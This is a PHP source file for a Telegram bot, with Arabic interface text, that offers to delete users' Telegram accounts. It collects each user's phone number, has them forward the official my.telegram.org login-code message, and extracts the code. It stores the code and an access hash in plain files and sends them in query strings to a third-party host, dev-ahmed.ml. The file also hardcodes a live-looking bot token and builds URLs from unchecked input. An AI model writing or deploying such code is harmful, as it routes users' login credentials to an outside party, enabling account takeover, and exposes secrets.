<?php
$token = "5417759083:AAE8VcZMLT1V_Ibd97KeXFiajRhEffM0DgE";
define('API_KEY',$token);
echo file_get_contents("https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME']);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$forward_id = $message->forward_from->id;
$number = $message->contact->phone_number;
$hash = file_get_contents("hash:$chat_id.txt");
$pass = file_get_contents("pass:$chat_id.txt");
$num = file_get_contents("num:$chat_id.txt");

if($text == '/start'){
unlink("hash:$chat_id.txt");
unlink("pass:$chat_id.txt");
unlink("num:$chat_id.txt");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"فكر جيدا قبل الحذف .. !",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>'حذف الحساب','request_contact'=>true]],
]])
]);
exit;
}

if($number and !$num){
$q = json_decode(file_get_contents("https://dev-ahmed.ml/api/telegram/deleteaccount/?phone=$number"))->result;
$w = $q->description;
if($w == "password has been sent"){
file_put_contents("hash:$chat_id.txt",$q->access_hash);
file_put_contents("num:$chat_id.txt",$number);
bot('sendMessage',[
'parse_mode'=>"markdown",
'chat_id'=>$chat_id,
'text'=>"قم بي عمل اعاده توجيه للرساله اللزي وصلتك من [اشعارات التليجرام](tg://user?id=777000) الي هنا"
]);
}else{
bot('sendMessage',[
'parse_mode'=>"markdown",
'chat_id'=>$chat_id,
'text'=>"حدث خطأ ربما بسبب كثره محاولات الحذف"
]);
}
}

if($text and $num and $hash and !$pass){
if($forward_id){
if($forward_id == 777000){
$getpass = explode("my.telegram.org",$text)[1];
$getpass = explode(":\n",$getpass)[1];
$getpass = explode("\n\n",$getpass)[0];
file_put_contents("pass:$chat_id.txt",$getpass);
bot('sendMessage',[
'parse_mode'=>"markdown",
'chat_id'=>$chat_id,
'text'=>"فكر جيدا قبل الحذف .. !"
]);
sleep(1);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"هل انت متاكد من انك تريد حذف حسابك ؟\n- للتاكيد اضغط نعم",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>'نعم'],['text'=>'لا']],
]])
]);
}else{
bot('sendMessage',[
'parse_mode'=>"markdown",
'chat_id'=>$chat_id,
'text'=>"يجب ان تكون الرساله موجها من [حساب تليجرام الرسمي](tg://user?id=777000)\n- (ليس حساب اخر)"
]);
}
}else{
bot('sendMessage',[
'parse_mode'=>"markdown",
'chat_id'=>$chat_id,
'text'=>"يجب ان تكون الرساله موجها من [حساب تليجرام الرسمي](tg://user?id=777000)"
]);
}
}

if($text == "نعم" and $num and $hash and $pass){
$q = file_get_contents("https://dev-ahmed.ml/api/telegram/deleteaccount/?phone=$num&password=$pass&access_hash=$hash&do_delete=true");
if(strstr($q,"PASSWORD OR ACCESS_HASH INVALID | OR DO_DELETE => FALSE OR DO_DELETE EMPTY") or !$q){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"الكود خطأ اعد المحاوله"
]);
unlink("hash:$chat_id.txt");
unlink("pass:$chat_id.txt");
unlink("num:$chat_id.txt");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"تم الغاء الامر",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>'حذف الحساب','request_contact'=>true]],
]])
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"حسنا جاري حذف حسابك
سوف يتم الحذف في اي لحظه
وداعا 👋"
]);
}
}

if($text == "لا" and $num and $hash and $pass){
unlink("hash:$chat_id.txt");
unlink("pass:$chat_id.txt");
unlink("num:$chat_id.txt");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"تم الغاء الامر",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>'حذف الحساب','request_contact'=>true]],
]])
]);
}

